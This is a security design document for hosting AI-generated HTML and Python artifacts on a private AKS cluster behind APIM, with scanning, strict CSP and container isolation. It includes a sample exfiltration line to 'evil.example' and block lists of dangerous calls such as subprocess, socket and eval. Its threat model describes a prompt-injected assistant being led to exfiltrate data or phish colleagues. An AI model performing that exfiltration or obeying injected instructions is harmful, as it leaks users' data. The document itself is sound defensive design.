# Self-hosted artifact publishing: Cowork → APIM → scan → private AKS

Status: design v2, 2026-10-14. Author: Peter (via Claude Code).
Scope: proof of concept. Nothing has been run. §11 lists what is verified against vendor docs and what is assumed.

Constraints this version is built under:
- Private AKS cluster. Viewers are internal only. Artifacts are shared inside the org, never public.
- Upstream Istio in **ambient mode**, already installed and approved.
- No VM-level pod sandboxing (AKS Pod Sandboxing / Kata is out by your call).
- Base images (Node, Python) come from your private JFrog Artifactory. ACR is available if useful.
- Azure API Management is the only front door. The MCP is exposed through APIM. Everything authenticates with Entra ID.
- No third-party tools unless surfaced and approved. ClamAV is not approved. gitleaks is approved (already enforced by policy in your Azure DevOps pipelines). §3a is the inventory.
- All deployments to AKS go through Azure DevOps. Service connections already exist for the AKS cluster and for SonarQube.

---

## 0. Situation in plain terms

Claude Cowork generates artifacts: single-file HTML/JS apps and, occasionally, a small Python app. Today "publish" means Anthropic hosts them on `*.claudeusercontent.com`. You want the same one-click feel, but the artifact lands on your private AKS cluster, under your domain, after passing your security gate, visible only to people in your Entra tenant.

The decision underneath the task: **you trust nothing in the bundle, so where do you enforce that: at scan time or at run time?** Scanning catches the obvious. Run-time containment is the wall. The design puts most of its weight on the second.

---

## 1. Verdict

**What's right in your plan**
- A skill plus a custom connector is the only extension model Cowork offers. Correct.
- APIM as the single door is correct and, it turns out, removes a whole component: APIM can expose your REST API's operations as MCP tools natively. There is no MCP server to write.
- Treating the output as adversarial is correct. With prompt injection, the "author" of an artifact may not be the person who asked for it.

**What changed from your original sketch**
- **No per-artifact container images.** Without VM isolation, building an image per Python app buys almost nothing and costs a builder, a signer, a verifier and per-image scanning. Instead: one curated Python runtime image built by your CI from your JFrog base. The artifact's code is mounted into a pod running that image, the same way static HTML is mounted into the gateway. The artifact is data again.
- **Two tiers.** Static HTML runs in the viewer's browser and never touches your cluster's compute. Python runs on your cluster. Different threat classes, different pipelines, one intake.
- **Nothing calls the Kubernetes API at run time.** The static path is a file copy into Blob. The Python path is an Azure DevOps pipeline run using your existing AKS service connection, with the human approval as an Environment approval check. The scanner is a queue worker deployed once by Azure DevOps, not a Job created per submission. The intake API ends up with no Kubernetes permissions at all.
- **A viewer shell.** Internal-only does not remove the parent-domain risks (§2a). Artifact content lives on a separate registrable domain inside an iframe on a corporate-domain page that does the Entra sign-in.

**The one real caution**
Without Pod Sandboxing, the wall around a Python artifact is the Linux container boundary on a dedicated node pool. That is what most shops run, and it is fine for internal dashboards. It also means a container-runtime kernel bug hands an artifact the node it runs on. Mitigation in this version: no cloud identity on those nodes' pods, no service-account token, no egress at all, nothing else scheduled on that pool, and a human approval step before any Python artifact goes live.

---

## 2. Threat model

| Attacker | How they get in | What they want |
|---|---|---|
| Prompt-injected Cowork | Poisoned web page or document the user asked Cowork to read | Exfiltrate viewer data, phish colleagues, plant a persistent page |
| Malicious insider with Cowork | Just asks for it | Run code on the cluster, reach internal services, mine crypto |
| Compromised skill repo or connector | Supply chain | Same as above, at scale |

**Static tier.** Code runs in the viewer's browser. Risks: internal phishing (a fake SSO page from a trusted colleague's link), viewer-side exfiltration, browser mining, cross-artifact data theft, CSRF against internal apps. Containment: one origin per artifact on a separate registrable domain, strict CSP with `connect-src 'none'`, sandboxed iframe inside a viewer shell whose `frame-src` pins navigation, no password inputs allowed, no external forms.

**Dynamic tier.** Code runs on your cluster. Risks: everything above plus lateral movement, egress abuse, resource exhaustion, node compromise via kernel bug. Containment: restricted Pod Security, dropped capabilities, read-only root, non-root, no service-account token, deny-all NetworkPolicy (blocks IMDS and DNS too), dedicated tainted node pool, CPU and memory limits, out of the mesh, mesh-wide policy rejecting plaintext callers, TTL, human approval.

**Thesis: containment over detection.** The scanner is a policy gate. The runtime constraints are the wall. A scanner false-negative should be embarrassing, not catastrophic.

---

## 2a. Internal-only hosting: what still touches the parent domain

Short answer: **it still matters.** Internal-only removes the reputation class of risk (Safe Browsing flags, search indexing, public certificate-transparency exposure). It does nothing about the browser-security class, because those come from the domain hierarchy, not from who can reach the site.

**1. Cookie scope.** A document at `x.artifacts.corp.com` can read every non-HttpOnly cookie set with `Domain=.corp.com`, and can *set* cookies for `.corp.com` (cookie tossing, session fixation). `HttpOnly` protects reads. Nothing protects writes except a different registrable domain.

**2. Same-site.** `SameSite=Lax` and `Strict` treat sibling subdomains of `corp.com` as the same site. An artifact can trigger GET navigations to any internal `*.corp.com` app with the viewer's cookies attached, bypassing SameSite-based CSRF defences. This is worse inside an org than outside, because that is where the legacy apps live.

**3. Navigation exfiltration.** CSP cannot block `location.href = "https://evil.example/?" + stolenData`. The `navigate-to` directive never shipped. The viewer's browser has internet access, so "internal-only" does not help. The fix is structural: render the artifact in an iframe inside a viewer shell whose own CSP sets `frame-src` to the artifact domain only. Any navigation of the frame elsewhere is blocked by the parent document's policy. That is why claude.ai renders artifacts inside claude.ai rather than as bare tabs.

**Consequences**
- Artifact content on a **separate registrable domain**: `corp-artifacts.net`, not `artifacts.corp.com`. Internal DNS and a private IP are fine. The point is the registrable domain.
- **Viewer shell** at `artifacts.corp.com/view/<id>`: Entra sign-in, audit log, mints a short-lived artifact-scoped token, iframes `https://<id>.corp-artifacts.net/?t=<token>` with `sandbox="allow-scripts allow-same-origin allow-forms allow-modals"` (no `allow-popups`, no `allow-top-navigation`). Shell CSP: `frame-src https://*.corp-artifacts.net`.
- Artifact gateway: validates the token once, sets a `__Host-` cookie (per-origin by construction), refuses top-level loads (`Sec-Fetch-Dest: document` → 302 to the shell), `frame-ancestors https://artifacts.corp.com`.
- Entra sign-in happens on the shell, never in the frame. `login.microsoftonline.com` refuses to be framed anyway.
- The share link is the shell URL. The raw artifact origin is an implementation detail.

---

## 3. Architecture

```
  Anthropic (160.79.104.0/21)        Cowork sandbox                        Internal viewers (Entra)
  MCP tool calls                     upload.sh (one-time token)            browser
        │                                   │                                   │
        ▼                                   ▼                                   │
  ┌──────────────────────────────────────────────┐                              │
  │ Application Gateway WAF_v2 (public IP)       │   the ONLY public surface    │
  │ listener mcp.corp.com → /artifacts-mcp/*     │                              │
  │                       → /artifacts/v1/*/upload│                             │
  └───────────────────────┬──────────────────────┘                              │
                          ▼                                                     │
  ┌──────────────────────────────────────────────┐                              │
  │ APIM (internal mode)                         │                              │
  │  MCP server "artifacts-mcp": 2 tools from    │                              │
  │    REST ops beginPublish, getPublishStatus   │                              │
  │  policies: validate-azure-ad-token, PRM 401, │                              │
  │    rate-limit, forward oid/upn               │                              │
  └───────────────────────┬──────────────────────┘                              │
                          ▼ private VNet                                        ▼
  ╔═══════════════════════════════════════════════════════════════════════════════════════════╗
  ║ Private AKS, upstream Istio ambient                                                        ║
  ║                                                                                            ║
  ║  ns artifacts-system (in mesh)                  Gateway API: Istio GatewayClass, internal LB║
  ║  ┌─────────────┐  Service Bus   ┌────────────┐  listeners: artifacts.corp.com (shell)      ║
  ║  │ intake-api  │───queue───────▶│ scanner    │             *.corp-artifacts.net (content)  ║
  ║  │ Node/TS     │                │ worker     │  TLS from Key Vault via Secrets Store CSI   ║
  ║  │ no k8s RBAC │◀── status ─────│ gitleaks   │                                             ║
  ║  │             │                │ checks.ts  │  malware: Defender for Storage scans the    ║
  ║  └─────────────┘                │ imports.py │  upload in Blob, result read by the worker  ║
  ║                                 │ policy.ts  │                                             ║
  ║                                 └─────┬──────┘                                             ║
  ║    ┌──────────────────────────────────┴───────┐                                            ║
  ║    ▼ static: copy to Blob serving/<id>/       ▼ python: trigger Azure DevOps pipeline      ║
  ║                                                 (gitleaks policy, Sonar advisory,          ║
  ║                                                  Environment approval, kubectl apply via   ║
  ║                                                  the AKS service connection)               ║
  ║  ns artifacts-static (in mesh)          ns artifacts-dynamic (NOT in mesh)                 ║
  ║  ┌──────────────────────────┐           ┌──────────────────────────────────┐               ║
  ║  │ static-gateway (Node)    │           │ one Deployment per approved app  │               ║
  ║  │ Blob CSI ro mount /srv   │           │ image: jfrog/.../python-runtime  │               ║
  ║  │ host → /srv/<id>/        │           │ app.py from ConfigMap (ro)       │               ║
  ║  │ CSP, token→__Host- cookie│           │ no SA token, deny-all NetPol     │               ║
  ║  └──────────────────────────┘           │ node pool "untrusted", tainted   │               ║
  ║                                         │ TTL label, GC by a scheduled ADO │               ║
  ║                                         │ pipeline, same service connection│               ║
  ║  viewer-shell (Node + MSAL) in          └──────────────────────────────────┘               ║
  ║  artifacts-system                                                                          ║
  ╚═══════════════════════════════════════════════════════════════════════════════════════════╝
                          │ private endpoints
                          ▼
         Azure Blob (intake/, serving/, jobs/) + Defender for Storage   Service Bus (scan queue)   Key Vault (TLS, HMAC key)   Entra ID (2 app regs)
         Azure DevOps: pipelines artifact-python-deploy and artifact-gc, AKS + Sonar service connections, Environment "artifacts-dynamic" with an approval check
```

**Components and size budget**

| Component | What it is | Where | Size |
|---|---|---|---|
| `publish-to-aks/` skill | SKILL.md, manifest schema, `preflight.sh`, `upload.sh` | your Cowork skills repo | ~160 lines |
| Custom connector | APIM MCP URL, "Use your own OAuth client" | Claude org settings, added once by an Owner | config |
| APIM | API from OpenAPI, MCP server over 2 operations, 4 policies | Azure | config |
| Entra | 2 app registrations | Azure | config |
| `intake-api/` | begin, upload, finalize, status, events (pipeline callback), view-token; enqueues scans; **no Kubernetes RBAC** | AKS `artifacts-system`, deployed once by Azure DevOps | ~350 lines |
| `scanner/` | queue worker: gitleaks (same version and rules as your ADO policy) + `checks.ts` + `imports.py` + `policy.ts` verdict; static publish = Blob copy; python = trigger pipeline | AKS `artifacts-system` Deployment, 2 replicas, deployed once by Azure DevOps | ~300 lines |
| `pipelines/artifact-python-deploy.yml` | fetch bundle, gitleaks policy, Sonar advisory, Environment approval, render manifests, `kubectl apply` via the AKS service connection, callback | Azure DevOps, your pipeline repo | ~120 lines YAML |
| `pipelines/artifact-gc.yml` | nightly: delete expired artifact Deployments, Services, HTTPRoutes, ConfigMaps via the AKS service connection; expire static prefixes in Blob | Azure DevOps, scheduled | ~40 lines YAML |
| Defender for Storage | on-upload malware scanning of the `intake` container, Microsoft Defender Antivirus engine, no infrastructure | Azure | config |
| `static-gateway/` | Node static server, headers, token→cookie, top-level refusal | AKS `artifacts-static` | ~90 lines |
| `viewer-shell/` | Node + MSAL sign-in, audit log, iframe page | AKS `artifacts-system` | ~120 lines |
| `python-runtime/` | Dockerfile from your JFrog Python base, pinned curated libs, `runtime-manifest.json` | your CI → JFrog | ~30 lines |
| `deploy/` | namespaces, Gateway, HTTPRoutes, NetworkPolicy, AuthorizationPolicy, Azure Policy assignments, node pool | AKS | ~350 lines |
| `artifactctl` | same HTTP calls from a terminal; for you and CI tests, never for Cowork. Approval is not here, it is in Azure DevOps. | your laptop | ~100 lines |

## 3a. Third-party inventory

Everything that is not Microsoft, Anthropic, or written by you:

| Component | Role | Status |
|---|---|---|
| Upstream Istio (ambient) | Mesh, Gateway API implementation | **Approved by you, already installed.** |
| gitleaks | Secrets detection | **Kept, needs your sign-off.** Single Go binary, no network, vendored into the scanner image you build from your JFrog base. |
| ClamAV | Malware signatures | **Not approved, removed.** Replaced by Microsoft Defender for Storage on-upload malware scanning: same job, Microsoft Defender Antivirus engine, SaaS, scans inside ZIP archives, private-endpoint aware. |
| semgrep | Static analysis rules | **Dropped.** Replaced by a ~150-line `checks.ts` for HTML/JS patterns and a ~40-line `imports.py` using Python's standard `ast` module. Both are yours, zero dependencies. Semgrep is better at depth; for v1 the CSP and the runtime constraints are the wall, so depth is not where the value is. |
| Trivy | Image and dependency CVEs | **Dropped from the pipeline.** No per-artifact images and no per-artifact `pip install` means nothing to scan per publish. The curated runtime image is scanned once by your CI (JFrog Xray if you have it, Defender for Containers if it lives in ACR). |
| Kyverno, OPA/conftest, cert-manager, cosign/notation, Ratify, Chainguard images, Kaniko/BuildKit, nginx, oauth2-proxy, KEDA HTTP add-on, ClamAV | Various | **Not used.** Replaced by Azure Policy for AKS, `policy.ts`, Key Vault + Secrets Store CSI, no signing (no per-artifact images), your JFrog images, no builds, a Node static server, MSAL in the shell, nothing (scale-to-zero deferred). |
| MCP TypeScript SDK | MCP server | **Not used.** APIM exposes REST operations as MCP tools natively. |

gitleaks is now the only open-source binary left. If it is also out, two Microsoft-only options: a ~40-line regex pack in `checks.ts` covering the high-signal secret formats (Azure storage keys and SAS tokens, AWS keys, GitHub and Slack tokens, private-key headers, JWTs), which catches most of what an AI-generated artifact would leak; or GitHub Advanced Security for Azure DevOps secret scanning, which is asynchronous and a minute or two slower per publish.

---

## 4. Named design decisions

**D1. Two tiers, one intake.** The manifest *claims* a tier; the scanner *verifies* it by content. A `.py` file in a static bundle is a reject. Static ships in seconds. Python goes through approval.

**D2. Bytes never pass through the model.** `artifact_publish_begin` returns a job id, an upload URL on APIM, and a one-time token bound to that job (10 min, single use, size-capped). The skill's script uploads the zip from the Cowork sandbox. The model only ever sees a manifest and a job id. Fallback if the sandbox cannot reach APIM: base64 inside the tool argument, hard-capped at 1 MiB, with the cost stated plainly.

**D3. The REST API is the interface. The MCP is APIM configuration.** Two operations become two tools. `artifactctl` drives the same API from a terminal so the whole pipeline is testable without Cowork.

**D4. Copy Anthropic's serving model.** Origin per artifact, CSP at the edge with every fetch blocked, downloads inert, a separate registrable domain, and the artifact rendered inside a shell page. Anthropic does almost no scanning; they constrain.

**D5. Static tier: one gateway, zero images.** Blob-backed content, host-based routing. Republish = overwrite a Blob prefix.

**D6. Dynamic tier: curated runtime, artifact mounted as data.** One `python-runtime` image built by your CI from your JFrog Python base with a pinned set of libraries (Streamlit, FastAPI, uvicorn, pandas, numpy, plotly, altair, pydantic). Its `runtime-manifest.json` lists what is importable. The artifact ships `app.py` only; the scanner rejects any import outside stdlib plus that list. `app.py` is mounted from a ConfigMap, so the pod needs no storage access, no cloud identity, no registry access beyond the runtime image. No builder, no signer, no per-artifact scan.

**D7. Policy as code, two places, human-readable.** Scanner verdicts in `intake-api/policy.ts` (a table). Cluster admission in Azure Policy assignments (built-in definitions, Microsoft-managed Gatekeeper). Repo behind branch protection and CODEOWNERS.

**D8. Viewer shell on the corporate domain, content on a separate registrable domain.** See §2a.

**D9. One front door: APIM.** MCP tool calls (from Anthropic's servers) and the upload (from the Cowork sandbox) both terminate at APIM. The Cowork egress allowlist has one entry.

**D10. Human approval before any Python artifact runs, as an Azure DevOps Environment approval.** The scanner verdict triggers the `artifact-python-deploy` pipeline, whose deploy stage targets the Environment `artifacts-dynamic`, which carries an approval check assigned to the Entra group `artifacts-approvers`. Approvers get the normal Azure DevOps notification, open the run, read the scan summary and the Sonar report, approve or reject. Cowork's status tool reports `awaiting_approval` with the run link. The audit trail is the pipeline run. This is the compensating control for not having VM isolation.

**D12. Nothing calls the Kubernetes API at run time.** Deployments to AKS happen only through Azure DevOps with the existing AKS service connection. intake-api and the scanner worker have no Kubernetes permissions. The static path is a Blob write. The Python path is a pipeline run. Expired artifacts are removed by a scheduled pipeline. Blast radius of an intake-api compromise shrinks to "can submit bundles and read status".

**D11. Artifact pods stay out of the mesh.** `artifacts-dynamic` carries no `istio.io/dataplane-mode` label. The Istio Gateway routes to non-mesh pods over plain HTTP inside the cluster, which Istio documents as supported. A mesh-wide `AuthorizationPolicy` that only allows mesh principals means a non-mesh pod cannot call any mesh service even if a NetworkPolicy is misconfigured.

---

## 5. Pipeline, stage by stage

| # | Stage | Tool | Rejects on | Tier |
|---|---|---|---|---|
| 1 | Intake | intake-api | zip > 25 MiB, > 500 files, zip-slip, symlinks, file types outside allowlist (`html css js json svg png jpg webp woff2 txt md csv py`), manifest invalid, tier mismatch by content | both |
| 2 | Secrets | gitleaks | any hit, no exceptions | both |
| 3 | Malware | Defender for Storage, on upload of `intake/{jobId}.zip` | scan result `Malicious`; `Error`, `Not scanned` or no result within 60 s → human review, not auto-allow | both |
| 4 | HTML/JS rules | `checks.ts` | `<script src>` not in CDN allowlist; `<form action>`, `<iframe src>`, `<meta http-equiv=refresh>`, `<link rel=import>` to any host; `<input type="password">`; `eval(`, `new Function(`, `document.write(` with non-literal input; base64 blob > 64 KiB inside `<script>`; any `<a>` to an external host (warn); `fetch`/XHR/WebSocket present (info) | static |
| 5 | Python rules | `imports.py` + `checks.ts` | any import outside stdlib ∪ `runtime-manifest.json`; `subprocess`, `os.system`, `os.exec*`, `os.fork`, `socket`, `ctypes`, `pickle`, `marshal`, `eval(`, `exec(`, `__import__`, `importlib`, `open(` with a path outside `/tmp`; any `requirements.txt` present (dependencies are not yours to choose) | python |
| 6 | Verdict | `policy.ts` | any `deny` row | both |
| 7 | Pipeline scan | Azure DevOps `artifact-python-deploy`: gitleaks under your existing policy, Sonar via the existing service connection | gitleaks hit (should never happen, stage 2 already ran); Sonar is **advisory**, its report is attached for the approver, it does not block | python |
| 8 | Approval | Environment `artifacts-dynamic` approval check, Entra group `artifacts-approvers` | rejected in Azure DevOps, or the check's timeout (set it to 7 days) | python |
| 9 | Deploy | static: scanner worker copies to `serving/<id>/`. python: pipeline renders ConfigMap + Deployment + Service + HTTPRoute with TTL label and applies them via the AKS service connection. Azure Policy denies anything that violates §6.7. | pipeline failure → `failed`, run link in status | both |
| 10 | GC | `artifact-gc` scheduled pipeline, nightly, same service connection; static prefixes expired in Blob by the same run | deletes expired artifacts and their routes | both |

Stages 1, 2, 4, 5 and 6 run in the scanner worker, a Deployment that consumes a Service Bus queue (one message per submission, 2 replicas, each scan a few seconds). Stage 3 runs in Azure the moment the upload commits: Defender for Storage reacts to the `BlobCreated` event, scans the ZIP in memory with the Microsoft Defender Antivirus engine, and writes the result. intake-api starts the Job immediately and requires the Defender result before issuing a verdict, so the two overlap. For the POC, the worker polls the blob's `Scan result` index tag every 2 s; for production, subscribe the storage account's Event Grid system topic to a Service Bus queue behind a private endpoint and consume that, because Microsoft states index tags are not tamper-resistant and should not be the sole security control. Findings return to the author through `artifact_publish_status` as structured JSON (`rule`, `file`, `line`, `severity`, `message`) so Cowork can fix and resubmit without a human.

---

## 6. Contracts

### 6.1 `manifest.json`
```json
{
  "schemaVersion": 2,
  "name": "q3-sales-dashboard",
  "tier": "static",
  "runtime": null,
  "entrypoint": "index.html",
  "externalScripts": [
    "https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.js"
  ],
  "ttlDays": 14,
  "generatedBy": { "tool": "cowork", "model": "<model-id>", "session": "<opaque>" }
}
```
Rules: `tier` ∈ {`static`, `python`}; `runtime` is `python-1` iff `tier=python` (names the curated image line); `entrypoint` is `index.html` or `app.py`; `externalScripts` each start with an allowlisted CDN prefix; `ttlDays` 1 to 90. No `visibility` field: everything is org-internal behind Entra.

### 6.2 REST API (intake-api, fronted by APIM) and the MCP tools derived from it
```
POST /v1/publish                      body: manifest          → { jobId, uploadUrl, uploadToken, uploadExpiresAt, maxBytes }
PUT  /v1/publish/{jobId}/upload       Bearer uploadToken, zip → 201
POST /v1/publish/{jobId}/finalize     Bearer uploadToken, {sha256} → { state: "scanning" }
GET  /v1/publish/{jobId}                                       → { state, url?, expiresAt?, findings?[], approver? }
POST /v1/publish/{jobId}/events       pipeline callback, bearer pipeline token → 204   (internal only, not on APIM)
POST /v1/view-token                   shell service identity   → { token }   (internal only, not on APIM)
```
APIM MCP server `artifacts-mcp` exposes **only** `beginPublish` and `getPublishStatus` as tools. Upload and finalize are reachable through APIM but are not MCP tools. Approval happens in Azure DevOps, not through this API. States: `awaiting_upload → scanning → rejected | awaiting_approval | deploying → live | failed | expired`. For Python, `awaiting_approval` and `deploying` are driven by pipeline callbacks to `/events`; the status response carries the run URL so Cowork can tell the publisher where the approval is.

### 6.3 `SKILL.md` outline
```markdown
---
name: publish-to-aks
description: Publish an HTML/JS or small Python artifact to the internal AKS artifact host instead of claude.ai. Use when the user says "publish internally", "host this on our cluster", "deploy to AKS", or asks for an internal shareable link. Requires the "Artifacts" connector.
---
## Output contract
- Everything in `dist/`. Static: `index.html` plus assets, no build step, no bundler.
- Scripts only from cdnjs.cloudflare.com or cdn.jsdelivr.net/npm, exact versions. No fetch, XHR, or WebSocket: they are blocked at serve time.
- No password inputs, no forms posting anywhere, no iframes, no meta refresh, no popups.
- No secrets, tokens, or keys anywhere, including comments.
- Python: a single `app.py`, runtime `python-1`. Only these libraries are available: see `${CLAUDE_SKILL_DIR}/reference/python-1-libraries.md`. No `requirements.txt`. No subprocess, sockets, file writes outside /tmp, or outbound HTTP. Python artifacts need a human approval before they go live; tell the user.
## Steps
1. Write `dist/manifest.json` per `${CLAUDE_SKILL_DIR}/reference/manifest-schema.json`.
2. Run `${CLAUDE_SKILL_DIR}/scripts/preflight.sh dist/`. Fix anything it flags.
3. Call the `beginPublish` tool with the manifest. Keep jobId, uploadUrl, uploadToken.
4. Run `${CLAUDE_SKILL_DIR}/scripts/upload.sh dist/ "<uploadUrl>" "<uploadToken>"`. If it prints NETWORK_BLOCKED, stop and tell the user the Cowork egress allowlist needs the APIM host. Do not retry with inline data.
5. Poll `getPublishStatus` every 10 s for up to 10 min. On `rejected`, fix each finding and resubmit (max 3 attempts). On `awaiting_approval`, report the approver group and stop. On `live`, report the URL and expiry.
```
The preflight is **feedback, not security**. The pipeline re-checks everything. Skill constraints: Agent Skills format, folder name equals `name`, description ≤ 1,024 chars, SKILL.md under 500 lines, scripts under `scripts/`. Cowork loads skills from your account's skills repo, not from `~/.claude/skills`.

Repo layout:
```
publish-to-aks/
├── SKILL.md
├── reference/
│   ├── manifest-schema.json
│   └── python-1-libraries.md       # generated from runtime-manifest.json by your CI
└── scripts/
    ├── preflight.sh                # secrets regex, script allowlist, password-input grep
    └── upload.sh                   # zip, PUT with bearer, POST finalize with sha256
```
The connector is registered separately by a Claude org Owner (Settings → Connectors). If your skills repo accepts plugins, add `.mcp.json` with `{ "mcpServers": { "artifacts": { "type": "http", "url": "https://mcp.corp.com/artifacts-mcp/mcp" } } }` and `.claude-plugin/plugin.json`.

### 6.4 Static gateway (Node, your JFrog Node image)
Behaviour, in order, for a request to `https://<id>.corp-artifacts.net/<path>`:
1. If `Sec-Fetch-Dest: document` → 302 to `https://artifacts.corp.com/view/<id>`. The raw origin only renders inside the shell.
2. If `?t=<token>` present → verify HMAC (key from Key Vault via Secrets Store CSI), check `artifactId` and expiry (5 min) → set `__Host-session=<signed session token>; Secure; HttpOnly; SameSite=None; Partitioned; Path=/` → 302 to the same path without `?t`. `SameSite=None` is required, not optional: the artifact origin is a different registrable domain from the shell by design (§2a), so every request from inside the shell's iframe is cross-site and a `Strict` or `Lax` cookie would never be sent. `Partitioned` (CHIPS) keys the cookie to the shell as the top-level site, so it keeps working when the browser blocks third-party cookies and cannot be replayed from any other embedding page.
3. Else require a valid `__Host-session` cookie; otherwise 403.
4. Serve `/srv/<id>/<path>` from the read-only Blob CSI mount with these headers on every response:
```
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net/npm/; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data: blob:; media-src 'self' data: blob:; connect-src 'none'; frame-ancestors https://artifacts.corp.com; form-action 'none'; base-uri 'none'; object-src 'none'; sandbox allow-scripts allow-same-origin allow-modals allow-forms
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=()
Cross-Origin-Opener-Policy: same-origin
Cache-Control: private, no-store
```
`'unsafe-inline'` is unavoidable for single-file artifacts in v1. Phase 3: compute SHA-256 of each inline `<script>` at publish time and emit `script-src 'sha256-…'` per artifact from Blob metadata. The `sandbox` list without `allow-downloads`, `allow-popups`, `allow-top-navigation` makes downloads inert and closes the popup channel. `allow-forms` keeps in-page forms working; `form-action 'none'` stops them posting anywhere.

Viewer shell page CSP: `default-src 'self'; frame-src https://*.corp-artifacts.net; script-src 'self'; style-src 'self'`. Iframe attribute: `sandbox="allow-scripts allow-same-origin allow-forms allow-modals"`.

### 6.5 Curated Python runtime (your CI, your JFrog base)
```dockerfile
FROM jfrog.corp.com/docker/python:3.12-slim
RUN python -m venv /venv && /venv/bin/pip install --no-cache-dir \
      streamlit==1.39.0 fastapi==0.115.0 uvicorn==0.30.6 \
      pandas==2.2.3 numpy==2.1.1 plotly==5.24.1 altair==5.4.1 pydantic==2.9.2
COPY runtime-manifest.json /runtime-manifest.json
RUN addgroup --system app && adduser --system --ingroup app --uid 65532 app
USER 65532
ENV PATH="/venv/bin:$PATH" HOME=/tmp PYTHONDONTWRITEBYTECODE=1
WORKDIR /app
EXPOSE 8080
```
Versions above are placeholders to pin to what your CI resolves. `runtime-manifest.json` lists importable top-level module names; your CI also renders it to `reference/python-1-libraries.md` for the skill. Entrypoint is chosen by the intake API per runtime: `streamlit run /app/app.py --server.port=8080 --server.address=0.0.0.0 --server.headless=true --browser.gatherUsageStats=false` or `uvicorn app:app --host 0.0.0.0 --port 8080 --app-dir /app`.

### 6.6 Dynamic tier: Deployment (rendered by the pipeline from a template in the pipeline repo, denied by Azure Policy if it drifts)
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: art-<id>
  namespace: artifacts-dynamic
  labels:
    artifacts.corp.com/id: "<id>"
    artifacts.corp.com/expires-at: "2026-10-28T00-00-00Z"
spec:
  replicas: 1
  selector: { matchLabels: { artifacts.corp.com/id: "<id>" } }
  template:
    metadata:
      labels: { artifacts.corp.com/id: "<id>" }
    spec:
      automountServiceAccountToken: false
      enableServiceLinks: false
      nodeSelector: { agentpool: untrusted }
      tolerations:
        - { key: artifacts.corp.com/untrusted, operator: Equal, value: "true", effect: NoSchedule }
      securityContext:
        runAsNonRoot: true
        runAsUser: 65532
        runAsGroup: 65532
        fsGroup: 65532
        seccompProfile: { type: RuntimeDefault }
      containers:
        - name: app
          image: jfrog.corp.com/artifacts/python-runtime@sha256:<digest>
          args: ["streamlit", "run", "/app/app.py", "--server.port=8080", "--server.address=0.0.0.0", "--server.headless=true", "--browser.gatherUsageStats=false"]
          ports: [{ containerPort: 8080 }]
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities: { drop: ["ALL"] }
          resources:
            requests: { cpu: 100m, memory: 128Mi }
            limits: { cpu: 500m, memory: 512Mi, ephemeral-storage: 256Mi }
          volumeMounts:
            - { name: code, mountPath: /app, readOnly: true }
            - { name: tmp, mountPath: /tmp }
          readinessProbe: { httpGet: { path: /, port: 8080 }, periodSeconds: 5, failureThreshold: 12 }
          livenessProbe: { httpGet: { path: /, port: 8080 }, periodSeconds: 30 }
      volumes:
        - name: code
          configMap: { name: art-<id>-code }
        - name: tmp
          emptyDir: { sizeLimit: 128Mi }
```
`app.py` lives in ConfigMap `art-<id>-code` (1 MiB cap, which is generous for a Cowork app; larger is a reject in v1). The pod has no storage access, no cloud identity, no DNS.

### 6.7 Cluster policy (all Microsoft-managed or built in)
- Namespace `artifacts-dynamic`: labels `pod-security.kubernetes.io/enforce=restricted`, `pod-security.kubernetes.io/enforce-version=latest`. No `istio.io/dataplane-mode` label.
- Azure Policy add-on assignments scoped to the cluster, effect `deny`: initiative **Kubernetes cluster pod security restricted standards for Linux-based workloads**; definition **Kubernetes cluster containers should only use allowed images** with regex `^jfrog\.corp\.com/artifacts/python-runtime@sha256:[a-f0-9]{64}$` on namespace `artifacts-dynamic`; definition **Kubernetes cluster containers should only use allowed capabilities** (empty allowlist, drop ALL); definition **Kubernetes cluster pod hostPath volumes should only use allowed host paths** (none). Azure Policy syncs in up to 20 minutes; test with `kubectl apply` of a deliberately bad pod after that.
- Node pool `untrusted`: `--node-taints artifacts.corp.com/untrusted=true:NoSchedule`, labels `agentpool=untrusted`, its own subnet, auto-upgrade channel `patch`, nothing else scheduled there. Nodes' kubelet identity is the cluster's; artifact pods cannot reach IMDS (egress deny) and have no token, so the node identity is only exposed by a container escape.

NetworkPolicy (standard Kubernetes, enforced by Azure CNI powered by Cilium):
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: { name: default-deny-all, namespace: artifacts-dynamic }
spec:
  podSelector: {}
  policyTypes: [Ingress, Egress]
  ingress:
    - from:
        - namespaceSelector: { matchLabels: { kubernetes.io/metadata.name: artifacts-system } }
          podSelector: { matchLabels: { gateway.networking.k8s.io/gateway-name: artifacts-internal } }
      ports: [{ port: 8080, protocol: TCP }]
  # no egress rules: no DNS, no IMDS, no cluster services, no internet
```

### 6.8 Istio ambient specifics
- Gateway `artifacts-internal` in `artifacts-system`, `gatewayClassName: istio`, internal load balancer annotation (`service.beta.kubernetes.io/azure-load-balancer-internal: "true"` via the Gateway's `infrastructure.annotations`), listeners `artifacts.corp.com` and `*.corp-artifacts.net`, `tls.mode: Terminate`, `certificateRefs` to Secrets synced from Key Vault by the Secrets Store CSI driver. Istio's Gateway deployment is created in the Gateway's namespace, which is why §6.7 selects by that namespace and the `gateway-name` label.
- Wildcard listener hostnames and a wildcard TLS Secret are core Gateway API; Istio 1.31+ is fully conformant.
- `artifacts-system` and `artifacts-static` carry `istio.io/dataplane-mode=ambient`. `artifacts-dynamic` does not. The Gateway routes to non-mesh pods over plain HTTP; Istio documents this as supported.
- HTTPRoutes in `artifacts-static` and `artifacts-dynamic` attach cross-namespace; the Gateway's `allowedRoutes.namespaces.selector` matches label `artifacts.corp.com/routes=allowed`.
- Viewer auth is MSAL inside the shell app, not `ext_authz`. It keeps the auth path independent of the mesh. If you later want ext_authz at the Gateway, L7 `AuthorizationPolicy` with `targetRefs` to the Gateway is supported in ambient without a waypoint.
- Defence in depth, mesh root namespace:
```yaml
apiVersion: security.istio.io/v1
kind: AuthorizationPolicy
metadata: { name: mesh-allow-only-mesh-principals, namespace: istio-system }
spec:
  action: ALLOW
  rules:
    - from:
        - source:
            principals: ["cluster.local/*"]
```
